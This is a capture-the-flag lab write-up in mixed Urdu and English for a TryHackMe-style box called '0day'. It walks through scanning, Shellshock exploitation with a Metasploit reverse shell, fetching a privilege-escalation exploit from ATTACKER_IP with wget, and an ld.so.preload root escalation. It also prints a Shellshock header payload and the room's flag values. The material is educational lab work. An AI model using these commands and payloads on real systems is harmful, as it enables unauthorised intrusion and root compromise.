Phase 1: Initial Reconnaissance (Scanning)
🔹 Tool: Nmap
nmap -sS -sV -sC 10.64.151.46 -T 4
• -sS → TCP SYN scan (stealth scan)
• -sV → Service version detection
• -sC → Default NSE scripts (basic vulns + info)
• -T 4 → Fast scanning (aggressive but safe)
• 10.64.151.46 → Target IP

22/tcp  → SSH
80/tcp  → HTTP
🔐 Port 22 – SSH
OpenSSH 6.6.1p1 Ubuntu
👉 Matlab:
◇ SSH service chal rahi hai
◇ Version thori purani hai
◇ Lekin credentials ke baghair access possible nahi
◇ Is stage par SSH ko ignore kiya
🌐 Port 80 – HTTP
Apache httpd 2.4.7 (Ubuntu)
👉 Important points:
◇ Apache version bohat purana
◇ Web server available → web attacks possible
◇ Website ka title: 0day
➡️ Main attack surface yahan se milega

Phase 2: Web Enumeration
🔹 Tool: Nikto
nikto -host 10.64.151.46
◇ Web server misconfigurations
◇ Known vulnerabilities
◇ Dangerous files & directories
◇ CGI scripts
 scan karta hai
📌 Nikto Findings (VERY IMPORTANT)
Missing Security Headers
X-Frame-Options missing
X-Content-Type-Options missing
👉 Matlab:
◇ Clickjacking possible
◇ MIME sniffing possible
📌 Low impact, lekin poor security posture show karta hai
Outdated Apache
Apache/2.4.7 appears to be outdated
👉 Matlab:
◇ Known exploits available ho sakte hain
◇ Old systems me RCE chances high
CGI Script Found
/cgi-bin/test.cgi
👉 Ye BOHAT critical finding hai
Kyun?
◇ CGI scripts environment variables use karti hain
◇ Bash agar vulnerable ho → Shellshock possible
Shellshock Vulnerability Detected
Site appears vulnerable to the 'shellshock' vulnerability
CVE-2014-6271 / CVE-2014-6278
👉 Matlab:
◇ Remote Command Execution (RCE)
◇ HTTP headers ke through server commands run ho sakti hain
◇ Direct system access ka rasta
📂 Interesting Directories
Nikto ne yeh bhi bataya:
/admin/
/backup/
/secret/
/css/ (directory listing)
/img/ (directory listing)
👉 Ye sab enumeration ke liye useful hain
 (Later ffuf se confirm hua)

Phase 3: Directory Bruteforcing
🔹 Tool: ffuf
ffuf -u 'http://10.64.151.46/FUZZ' -w /usr/share/dirb/wordlists/common.txt
✔ Confirmed paths:
/admin
/backup
/cgi-bin
/secret
/robots.txt
/uploads
👉 /cgi-bin confirm hua
 👉 Shellshock attack path validated

🧭 Phase 4: Exploitation (Shellshock)
🔹 Tool: Metasploit
Step 1: Metasploit start
msfconsole
Step 2: Shellshock module search
search shellshock
Step 3: Correct module select
use exploit/multi/http/apache_mod_cgi_bash_env_exec
👉 Ye module:
◇ Apache
◇ CGI
◇ Bash
 ke Shellshock ko exploit karta hai
Step 4: Options set
set RHOSTS 10.64.151.46
set TARGETURI /cgi-bin/test.cgi
set LHOST 192.168.129.201
Step 5: Exploit run
run
🎉 Result:
Meterpreter session opened
👉 Matlab:
◇ RCE successful
◇ Reverse shell mil gaya
◇ User: www-data

Phase 5: Post Exploitation (User Flag)
🔹 Shell access
shell
🔍 User check
whoami
www-data
🔍 Home directories
cd /home
ls
ryan
🏁 User Flag
cd ryan
cat user.txt
THM{Sh3llSh0ck_r0ckz}
✔ User flag obtained

🧭 Phase 6: Privilege Escalation
🔍 SUID files enumeration
find / -type f -perm -04000 -ls 2>/dev/null
👉 Iska matlab:
◇ Root owned binaries jo normal user chala sakta hai
◇ Privilege escalation ke liye important
🔍 Writable directory check
cd /tmp
👉 /tmp:
◇ World writable
◇ Exploits upload karne ke liye best jagah
🔹 Exploit upload
wget http://ATTACKER_IP/exploit.c
🔧 Compile exploit
gcc exploit.c -o exploit
👉 Matlab:
◇ C exploit compile ho gaya
◇ Executable ready
🚀 Run exploit
./exploit
🎉 Exploit Output:
/etc/ld.so.preload created
creating shared library
whoami → root
👉 Exploit ne:
◇ ld.so.preload abuse kiya
◇ Root privileges gain ki
🏁 Root Flag
cd /root
cat root.txt
THM{g00d_j0b_0day_is_Pleased}
✅ FINAL SUMMARY (One Look)

| Phase | Result |
| Nmap | Apache + CGI detected |
| Nikto | Shellshock vulnerability found |
| ffuf | Hidden directories confirmed |
| Metasploit | RCE via Shellshock |
| Post Exploit | User flag |
| Priv Esc | Local exploit |
| Root | Full system compromise |


🧠 Key Learning Points
◇ Old Apache + CGI = Danger
◇ Shellshock = Header based RCE
◇ /tmp = Exploit playground
◇ Enumeration = 70% success
◇ Automated tools + manual thinking = win


----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

“Old Apache + CGI = Danger”

CGI kya hota hai?
CGI = Common Gateway Interface
👉 CGI ek mechanism hai jiske through:
• Web server (Apache)
• System-level programs / scripts
 run karta hai
Matlab:
Web request → direct OS command / script execution

Normal Website vs CGI

Normal Website (HTML / PHP)
Browser → Apache → HTML/PHP → Response
✔ Mostly controlled
✔ Limited system access

CGI-based Website
Browser → Apache → CGI script → OS / Bash → Response
🚨 Direct OS interaction
CGI scripts aksar hoti hain:
◇ bash
◇ sh
◇ perl
◇ python

CGI ka common path
/cgi-bin/
Tumhare case me:
/cgi-bin/test.cgi
Aur file ke andar:
#!/bin/bash
Matlab:
◇ Ye script bash shell se run hoti hai
◇ Bash agar vulnerable ho → direct RCE

CGI + Bash = Shellshock ka reason

CGI ka kaam:
◇ HTTP headers ko environment variables bana deta hai
Example:
User-Agent → HTTP_USER_AGENT
CGI ye variable Bash ko pass karta hai
Shellshock bug kya karta tha?
Bash:
◇ Environment variables me function-like syntax dekhta
◇ Aur uske baad likhi command execute kar deta
Attacker ne kya kiya?
User-Agent: () { :; }; id

➡️ Bash ne id command chala di

Old Apache + CGI kyun dangerous hai?

| Component | Problem |
| Old Apache | Vulnerable modules |
| CGI enabled | OS-level execution |
| Bash vulnerable | Shellshock |
| HTTP headers | Attacker controlled |

Result:
 Remote Command Execution (RCE)
Tumhare Room ka Real Example
/cgi-bin/test.cgi
Script:
#!/bin/bash
Nikto output:
Site appears vulnerable to the shellshock vulnerability
Sab cheezein chain ho gayin:
 Apache + CGI + Bash + Old version = 💀

One-line yaad rakhne wali definition
CGI allows a web server to execute system-level scripts, and when combined with vulnerable Bash versions, it can lead to remote command execution via HTTP headers.

CTF / Interview Tip
Agar kabhi yeh dekho:
◇ /cgi-bin/
◇ .cgi files
◇ #!/bin/bash
🚨 Turant socho:
◇ Shellshock?
◇ RCE?
◇ Command injection?
